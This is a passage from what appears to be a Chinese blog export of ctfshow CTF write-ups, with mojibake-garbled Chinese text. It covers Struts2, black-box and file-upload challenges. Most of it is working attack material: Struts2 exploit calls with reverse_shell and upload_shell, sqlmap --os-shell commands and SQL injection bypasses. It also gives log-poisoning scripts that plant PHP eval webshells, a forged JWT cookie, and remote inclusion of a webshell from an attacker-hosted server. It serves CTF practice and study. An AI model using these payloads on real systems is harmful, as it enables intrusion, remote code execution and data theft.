S2_007(&quot;http://192.168.100.8:8080/user.action&quot;, &quot;name=admin&amp;email=admin&amp;age=&#123;exp&#125;&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_008(&quot;http://192.168.100.8:8080&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_009(&quot;http://192.168.100.8:8080/ajax/example5.action?age=123&quot;, &quot;name&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_012(&quot;http://192.168.100.8:8080/S2-012/user.action?name=&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_013(&quot;http://192.168.100.8:8080/S2-013/link.action&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"># print(s.upload_shell(&#x27;/usr/local/tomcat/webapps/ROOT/shell.jsp&#x27;, &#x27;shell.jsp&#x27;))</span><br><span class="line"> </span><br><span class="line"># s = S2_015(&quot;http://192.168.100.8:8080/param.action&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_016(&quot;http://192.168.100.8:8080/index.action&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"># print(s.exec_cmd1(&#x27;ls -la&#x27;))</span><br><span class="line"># print(&#x27;---------------------&#x27;)</span><br><span class="line"># print(s.exec_cmd2(&#x27;ls -la&#x27;))</span><br><span class="line"># print(&#x27;---------------------&#x27;)</span><br><span class="line"># print(s.exec_cmd3(&#x27;ls -la&#x27;))</span><br><span class="line"># print(s.upload_shell1(&#x27;/usr/local/tomcat/webapps/ROOT/shell.jsp&#x27;, &#x27;shell.jsp&#x27;))</span><br><span class="line"># print(s.upload_shell(&#x27;/usr/local/tomcat/webapps/ROOT/shell.jsp&#x27;, &#x27;shell.jsp&#x27;))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_019(&quot;http://192.168.100.8:8080/example/HelloWorld.action&quot;)</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"># print(s.upload_shell(&#x27;/usr/local/tomcat/webapps/ROOT/shell.jsp&#x27;, &#x27;shell.jsp&#x27;))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_029(&quot;http://192.168.100.8/default.action&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_032(&quot;http://192.168.100.8:8080/index.action&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_033(&quot;http://192.168.100.8/orders/3&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_037(&quot;http://192.168.100.8:8080/orders/3/&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_045(&quot;http://192.168.100.8/memoshow.action&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"># print(s.upload_shell(&#x27;/usr/local/tomcat/webapps/ROOT/shell.jsp&#x27;, &#x27;shell.jsp&#x27;))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_046(&quot;http://192.168.100.8/doUpload.action&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"># print(s.upload_shell(&#x27;/usr/local/tomcat/webapps/ROOT/shell.jsp&#x27;, &#x27;shell.jsp&#x27;))</span><br><span class="line"> </span><br><span class="line"># s = S2_052(&#x27;http://192.168.100.8/orders/3/edit&#x27;)</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_048(&quot;http://192.168.100.8/integration/saveGangster.action&quot;, data=&#x27;name=&#123;exp&#125;&amp;age=123&amp;__checkbox_bustedBefore=true&amp;description=123&#x27;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_048(&quot;http://192.168.100.8/integration/saveGangster.action&quot;, data=&#x27;name=&#123;exp&#125;&amp;age=123&amp;__checkbox_bustedBefore=true&amp;description=123&#x27;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_053(&quot;http://192.168.100.8&quot;, data=&#x27;name=&#123;exp&#125;&#x27;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_devMode(&quot;http://192.168.100.8/orders&quot;)</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_057(&quot;http://192.168.100.8:8080/showcase/actionChain1.action&quot;)</span><br><span class="line"># print(s.check())</span><br><span class="line"># print(s.exec_cmd(&quot;cat /etc/passwd&quot;))</span><br><span class="line"># s.reverse_shell(&quot;192.168.100.8&quot;, 9999)</span><br></pre></td></tr></table></figure>



<p>è¯•ä¸€è¯•ï¼Œæ€»æœ‰ä¸€ä¸ªå·¥å…·èƒ½æ‰«å‡ºæ¥ã€‚</p>
<h2 id="web281"><a href="#web281" class="headerlink" title="web281"></a>web281</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python /home/zhou/æ¡Œé¢/Struts2Scan-main2/Struts2Scan.py -u http://e17352eb-573e-46ab-883c-f4f9c9e0b05a.challenge.ctf.show/S2-007/user.action -n S2-016 --exec</span><br></pre></td></tr></table></figure>

<p>env</p>
<h2 id="web282"><a href="#web282" class="headerlink" title="web282"></a>web282</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python /home/zhou/æ¡Œé¢/Struts2Scan-main2/Struts2Scan.py -u http://bacf75dd-e6b8-408f-8dbf-96393355c935.challenge.ctf.show/S2-008/ -n S2-008 --exec</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œenvå‘½ä»¤å³å¯</p>
<h2 id="web283"><a href="#web283" class="headerlink" title="web283"></a>web283</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python /home/zhou/æ¡Œé¢/scanjava -u http://f89ab82b-bf00-4be0-9fff-b4927359e0b0.challenge.ctf.show/S2-009/showcase.jsp  -n S2-008 --exec</span><br></pre></td></tr></table></figure>

<h2 id="web284"><a href="#web284" class="headerlink" title="web284"></a>web284</h2><p>æ²¡æ‰«æå‡ºæ¥</p>
<h2 id="web285"><a href="#web285" class="headerlink" title="web285"></a>web285</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python /home/zhou/æ¡Œé¢/Struts2Scan-main2/Struts2Scan.py -u http://31827834-612a-41c2-9f06-9d1c6922cc8d.challenge.ctf.show/S2-013/ -n S2-016 --exec</span><br></pre></td></tr></table></figure>

<h2 id="web286"><a href="#web286" class="headerlink" title="web286"></a>web286</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /home/zhou/æ¡Œé¢/scanjava -u http://54a3836e-b43d-4729-9bda-c0c23a1120c1.challenge.ctf.show/S2-015/ -n S2-045 --exec</span><br></pre></td></tr></table></figure>

<h2 id="web287"><a href="#web287" class="headerlink" title="web287"></a>web287</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /home/zhou/æ¡Œé¢/scanjava -u http://853f6c12-23a7-41ec-b348-b13be3564049.challenge.ctf.show/S2-016/ -n S2-045 --exec</span><br></pre></td></tr></table></figure>

<h2 id="web288"><a href="#web288" class="headerlink" title="web288"></a>web288</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /home/zhou/æ¡Œé¢/scanjava -u http://d9f873ad-c396-4e2b-b7d4-67cc2985cdfc.challenge.ctf.show/S2-019/example/HelloWorld.action -n S2-045 --exec</span><br></pre></td></tr></table></figure>

<h2 id="web289"><a href="#web289" class="headerlink" title="web289"></a>web289</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /home/zhou/æ¡Œé¢/scanjava -u http://d6d16853-7bbc-4a03-8ade-233139abddc1.challenge.ctf.show/S2-029/ -n S2-045 --exec</span><br></pre></td></tr></table></figure>

<h2 id="web290"><a href="#web290" class="headerlink" title="web290"></a>web290</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /home/zhou/æ¡Œé¢/scanjava -u http://fe185d70-2910-4b03-b06d-fe4fe6f17e45.challenge.ctf.show/S2-032/ -n S2-045 --exec</span><br></pre></td></tr></table></figure>

<h2 id="web291"><a href="#web291" class="headerlink" title="web291"></a>web291</h2>]]></content>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-é»‘ç›’æµ‹è¯•</title>
    <url>/2023/04/16/ctfshow%E5%90%88%E9%9B%86-ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<p>  ctfshow é»‘ç›’æµ‹è¯•</p>
  <span id="more"></span>

<h2 id="web381"><a href="#web381" class="headerlink" title="web381"></a>web381</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://81d1568a-588d-4fc9-abeb-369f884876f7.challenge.ctf.show/alsckdfy/</span><br></pre></td></tr></table></figure>

<p>è®¿é—®è¿™ä¸ªåœ°å€å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;&gt;</span><br><span class="line">  &lt;title&gt;CTFshowèŒæ–°åšå®¢&lt;/title&gt;</span><br><span class="line">  &lt;link rel=&quot;stylesheet&quot; href=&quot;layui/css/layui.css&quot;&gt;</span><br><span class="line">  &lt;link rel=&quot;stylesheet&quot; href=&quot;layui/css/global.css&quot;&gt;</span><br><span class="line">  &lt;link rel=&quot;stylesheet&quot; href=&quot;alsckdfy/layui/css/tree.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªåœ°å€åœ¨æºç é‡Œå¯ä»¥çœ‹åˆ°</p>
<h2 id="web382-web383"><a href="#web382-web383" class="headerlink" title="web382,web383"></a>web382,web383</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://81d1568a-588d-4fc9-abeb-369f884876f7.challenge.ctf.show/alsckdfy/</span><br></pre></td></tr></table></figure>

<p>è®¿é—®è¿™é‡Œï¼Œä¸‡èƒ½å¯†ç ç™»å½•å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or 1=1-- -</span><br></pre></td></tr></table></figure>

<h2 id="web384"><a href="#web384" class="headerlink" title="web384"></a>web384</h2><p>ç”Ÿæˆå­—å…¸çš„è„šæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import string</span><br><span class="line">s1=string.ascii_lowercase</span><br><span class="line">s2=string.digits</span><br><span class="line">f=open(&#x27;dict.txt&#x27;,&#x27;w&#x27;)</span><br><span class="line">for i in s1:</span><br><span class="line">	for j in s1:</span><br><span class="line">		for k in s2:</span><br><span class="line">			for l in s2:</span><br><span class="line">				for m in s2:</span><br><span class="line">					p=i+j+k+l+m</span><br><span class="line">					f.write(p+&quot;\n&quot;)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<h2 id="web385"><a href="#web385" class="headerlink" title="web385"></a>web385</h2><p>æ‰«ä¸€ä¸‹ï¼Œå‘ç°install</p>
<p>è®¿é—®ä¸€ä¸‹ï¼Œå‡ºç°</p>
<p>è¯·åŠ¡å¿…åœ¨å®‰è£…æˆåŠŸååˆ é™¤æœ¬æ–‡ä»¶<br>éœ€è¦é‡æ–°å®‰è£…è¯·è®¿é—®install&#x2F;?install,ç®¡ç†å‘˜å¯†ç å°†é‡ç½®ä¸ºé»˜è®¤å¯†ç </p>
<p>è®¿é—®ä¸€ä¸‹&#x2F;install&#x2F;?install</p>
<p>å†æ¬¡ç™»å½•&#x2F;alsckdfy&#x2F;</p>
<p>åˆå§‹æˆ·åå¯†ç <code>admin admin888</code></p>
<p>è¿™æ˜¯ç”±ä¹‹å‰çš„é¢˜å¾—å‡ºæ¥çš„</p>
<h2 id="web386"><a href="#web386" class="headerlink" title="web386"></a>web386</h2><p>è®¿é—®install</p>
<p>lock.datå­˜åœ¨ï¼Œä½ å·²ç»å®‰è£…è¿‡äº†ï¼Œè¯·å‹¿é‡å¤å®‰è£…</p>
<p>è®¿é—®clear.php,çŒœä¸€æ‰‹ï¼Œfileå‚æ•°åˆ é™¤æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/clear.php?file=index.php</span><br></pre></td></tr></table></figure>

<p>ç„¶åé¡µé¢å°±æ²¡æ²¡äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/clear.php?file=install/lock.php</span><br></pre></td></tr></table></figure>

<p>ç»§ç»­è®¿é—®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/alsckdfy/     ç™»å½•å³å¯</span><br></pre></td></tr></table></figure>

<h2 id="web387"><a href="#web387" class="headerlink" title="web387"></a>web387</h2><p>robots.txtå­˜åœ¨&#x2F;debug</p>
<p>è®¿é—®debug</p>
<p>å†…å®¹æ˜¯</p>
<p>file not exist</p>
<p>çŒœä¸€ä¸‹æ˜¯ä¼ é€’ä¸€ä¸ªfileå‚æ•°ï¼Œæ–‡ä»¶åŒ…å«</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/debug?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<p>æ— æ³•å†™å…¥é©¬ï¼Œå‘½ä»¤æ‰§è¡Œæ— å›æ˜¾</p>
<p>ç›´æ¥å°è¯•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;cat /var/www/html/alsckdfy/check.php&gt;/var/www/html/1.txt&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web388"><a href="#web388" class="headerlink" title="web388"></a>web388</h2><p>å†™å…¥ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">url=&quot;http://1dbe73d8-655c-4c06-a9c2-057cd44eaf2f.challenge.ctf.show/&quot;</span><br><span class="line">url2=&quot;http://1dbe73d8-655c-4c06-a9c2-057cd44eaf2f.challenge.ctf.show//debug/?file=/var/log/nginx/access.log&quot;</span><br><span class="line">cmd=b&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span><br><span class="line">cmd=base64.b64encode(cmd).decode()</span><br><span class="line">headers=&#123;</span><br><span class="line">	&#x27;User-Agent&#x27;:&#x27;&#x27;&#x27;&lt;?php system(&#x27;echo &#123;0&#125;|base64 -d  &gt; /var/www/html/b.php&#x27;);?&gt;&#x27;&#x27;&#x27;.format(cmd)</span><br><span class="line">&#125;</span><br><span class="line">print(headers)</span><br><span class="line">requests.get(url=url,headers=headers)</span><br><span class="line">requests.get(url2)</span><br><span class="line">print(requests.post(url+&#x27;b.php&#x27;,data=&#123;&#x27;1&#x27;:&#x27;system(&quot;cat alsckdfy/check.php&quot;);&#x27;&#125;).text)</span><br></pre></td></tr></table></figure>

<h2 id="web389"><a href="#web389" class="headerlink" title="web389"></a>web389</h2><p>jwt ä¼ªé€ ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">url=&quot;http://bf2e6fca-c437-4f5b-90c3-75b4087cfdc5.chall.ctf.show/&quot;</span><br><span class="line">url2=&quot;http://bf2e6fca-c437-4f5b-90c3-75b4087cfdc5.chall.ctf.show/debug/?file=/var/log/nginx/access.log&quot;</span><br><span class="line">cmd=b&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span><br><span class="line">cmd=base64.b64encode(cmd).decode()</span><br><span class="line">headers=&#123;</span><br><span class="line">	&#x27;User-Agent&#x27;:&#x27;&#x27;&#x27;&lt;?php system(&#x27;echo &#123;0&#125;|base64 -d  &gt; /var/www/html/b.php&#x27;);?&gt;&#x27;&#x27;&#x27;.format(cmd),</span><br><span class="line">	&#x27;Cookie&#x27;:&#x27;auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYxMDQ0MDA5MSwiZXhwIjoxNjEwNDQ3MjkxLCJuYmYiOjE2MTA0NDAwOTEsInN1YiI6ImFkbWluIiwianRpIjoiYzNlM2U5NjQ4OGI3NWY0MzY4YmE4Njg0ZTRjZWJlZTQifQ.hEV8CkkdvhKsNL_OrssrBzjzstVhq7_sQNefiuplSqU&#x27;</span><br><span class="line">&#125;</span><br><span class="line">print(headers)</span><br><span class="line">requests.get(url=url,headers=headers)</span><br><span class="line">requests.get(url2,headers=headers)</span><br><span class="line">print(requests.post(url+&#x27;b.php&#x27;,data=&#123;&#x27;1&#x27;:&#x27;system(&quot;cat alsckdfy/check.php&quot;);&#x27;&#125;,headers=headers).text)</span><br></pre></td></tr></table></figure>



<h2 id="web390"><a href="#web390" class="headerlink" title="web390"></a>web390</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://6db122df-7ba0-4835-bb91-00984aed8475.challenge.ctf.show/page.php?id=1 --os-shell -batch </span><br></pre></td></tr></table></figure>

<p>ç›´æ¥æ‹¿åˆ°shell,ä½†è¿™ä¸ªshellå¥½åƒåªæœ‰cat æƒé™ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://fdbabc63-b2f3-4050-8b2e-9f5ee609119a.chall.ctf.show/page.php?id=2 --file-read /var/www/html/alsckdfy/check.php --batch</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå®Œä¼šå°†æ–‡ä»¶ä¿å­˜åœ¨ä½ çš„æœ¬åœ°ï¼Œç›´æ¥è®¿é—®å°±æ‹¿åˆ°flag</p>
<h2 id="web391"><a href="#web391" class="headerlink" title="web391"></a>web391</h2><p>å·¦ä¸Šè§’å‡ºæ¥ä¸€ä¸ªèŒæ–°å¾€äº‹ï¼Œè¿™ä¸ªçŒœä¸€ä¸‹å°±çŸ¥é“æ˜¯æ³¨å…¥ç‚¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://86300148-3fae-429c-bd62-2397e24809b8.challenge.ctf.show/search.php?title=123 --os-shell --batch</span><br></pre></td></tr></table></figure>

<h2 id="web392"><a href="#web392" class="headerlink" title="web392"></a>web392</h2><p>å¦‚ä¸Š391</p>
<h2 id="web393"><a href="#web393" class="headerlink" title="web393"></a>web393</h2><p>åœ¨èŒæ–°å¾€äº‹é‡Œæœ‰æ³¨å…¥ç‚¹æœç´¢</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://1ad914e4-74b3-4f2b-8aa9-d8ea8e9755e8.challenge.ctf.show/search.php?title=123 --current-db</span><br></pre></td></tr></table></figure>

<p>æ•°æ®åº“ctfshow</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://94520176-d91c-4e45-8f53-206a179b60f7.challenge.ctf.show/search.php?title=4 -D &#x27;ctfshow&#x27; --tables</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin_user |</span><br><span class="line">| content    |</span><br><span class="line">| link </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://1ad914e4-74b3-4f2b-8aa9-d8ea8e9755e8.challenge.ctf.show/search.php?title=123 -D ctfshow -T link --columns</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">| Column | Type         |</span><br><span class="line">+--------+--------------+</span><br><span class="line">| id     | int(11)      |</span><br><span class="line">| name   | varchar(255) |</span><br><span class="line">| url    | varchar(255) </span><br></pre></td></tr></table></figure>

<p>å †å æ³¨å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/search.php?title=1&#x27;;insert into link values(99,&#x27;flag&#x27;,&#x27;file:///flag&#x27;);</span><br></pre></td></tr></table></figure>

<p>ç„¶åè®¿é—®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/link.php?id=99</span><br></pre></td></tr></table></figure>

<p>å³å¯çœ‹è§flag</p>
<h2 id="web394-395æœªå†™"><a href="#web394-395æœªå†™" class="headerlink" title="web394,395æœªå†™"></a>web394,395æœªå†™</h2>]]></content>
  </entry>
  <entry>
    <title>ctfshowæ–‡ä»¶ä¸Šä¼ </title>
    <url>/2023/02/15/ctfshow%E5%90%88%E9%9B%86-ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<p>  æ–‡ä»¶ä¸Šä¼ </p>
 <span id="more"></span>

<p>ç»•è¿‡&lt;?  ç”¨</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>åç¼€æ”¹ä¸º phtml</p>
<h2 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h2><p><a href="https://blog.csdn.net/miuzzx/article/details/109537262">(9æ¡æ¶ˆæ¯) CTFSHOWæ–‡ä»¶ä¸Šä¼ ç¯‡_ctfshow web162_yu22xçš„åšå®¢-CSDNåšå®¢</a></p>
<p>phpæ–­æ ‡ç­¾ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=(è¡¨è¾¾å¼)?&gt;  ç­‰ä»·äº &lt;?php echo (è¡¨è¾¾å¼)?&gt;</span><br><span class="line">&lt;?=eval($_POST[1])?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h2><p>è¿‡æ»¤äº†[],ç”¨èŠ±æ‹¬å·ä»£æ›¿</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=eval($_POST&#123;1&#125;)?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web157-158-159"><a href="#web157-158-159" class="headerlink" title="web157,158,159"></a>web157,158,159</h2><p>åˆ›å»ºä¸€ä¸ª**.user.ini.png**</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_append_file=/var/www/html/upload/1.png</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºä¸€ä¸ª1.pngï¼Œå¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=`tac ../f*`?&gt;</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤ç»•è¿‡ï¼Œè®¿é—®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://4857c3f8-49e2-4795-9726-07bf02c02c5e.challenge.ctf.show/upload/</span><br></pre></td></tr></table></figure>

<p>å³å¯çœ‹è§flag</p>
<h2 id="web160-161"><a href="#web160-161" class="headerlink" title="web160,161"></a>web160,161</h2><p>æ—¥å¿—åŒ…å«ä¸Šä¼ æ–‡ä»¶1.png</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºä¸€ä¸ª**.user.ini.png**</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_append_file=/var/www/html/upload/1.png</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ ï¼Œè®¿é—®upload</p>
<p>æŠ“åŒ…ï¼Œä¿®æ”¹ua</p>
<p>161å¢åŠ gif86a</p>
<h2 id="web162163"><a href="#web162163" class="headerlink" title="web162163"></a>web162163</h2><p>è¿œç¨‹æ–‡ä»¶åŒ…å«</p>
<p>æ—¥å¿—åŒ…å«ï¼ŒæŠŠ <strong>.</strong> ç»™è¿‡æ»¤äº†ï¼Œä¼ å…¥çš„å†…å®¹ä¸èƒ½æœ‰ç‚¹</p>
<p>åœ¨äº‘ä¸»æœºä¸Šå†™å…¥æ–‡ä»¶123</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=eval($_POST[1])?&gt;</span><br></pre></td></tr></table></figure>

<p>å¼€å¯http</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 5000</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ æ–‡ä»¶123.png,æŠ“åŒ…æ”¹åä¸º123</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF86A?</span><br><span class="line">&lt;?=include&quot;http://1697363581:5000/123&quot;?&gt;</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºä¸€ä¸ª**.user.ini.png**</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_append_file=123</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ ï¼Œè®¿é—®upload</p>
<p>å‘½ä»¤æ‰§è¡Œå³å¯ï¼Œå†™ä¸ªé©¬å‘ç°æ²¡æœ‰æƒé™æŸ¥çœ‹æºç ï¼Œä¸æ¸…æ¸…æ¥šé¢˜ç›®å…¨è²Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#IPè½¬æ¢ä¸ºé•¿æ•´å‹</span><br><span class="line">def ip2long(ip):</span><br><span class="line">    ip_list=ip.split(&#x27;.&#x27;) #â¾¸å…ˆå…ˆæŠŠipçš„ç»„æˆä»¥&#x27;.&#x27;åˆ‡å‰²ç„¶åé€æ¬¡è½¬æ¢æˆå¯¹åº”çš„â¼†è¿›åˆ¶</span><br><span class="line">    result = 0</span><br><span class="line">    for i in range(4): #0,1,2,3</span><br><span class="line">        result = result+int(ip_list[i])*256**(3-i)</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">#é•¿æ•´å‹è½¬æ¢ä¸ºIP</span><br><span class="line">def long2ip(long):</span><br><span class="line">    floor_list = []</span><br><span class="line">    num = long</span><br><span class="line">    for i in reversed(range(4)):</span><br><span class="line">        res = 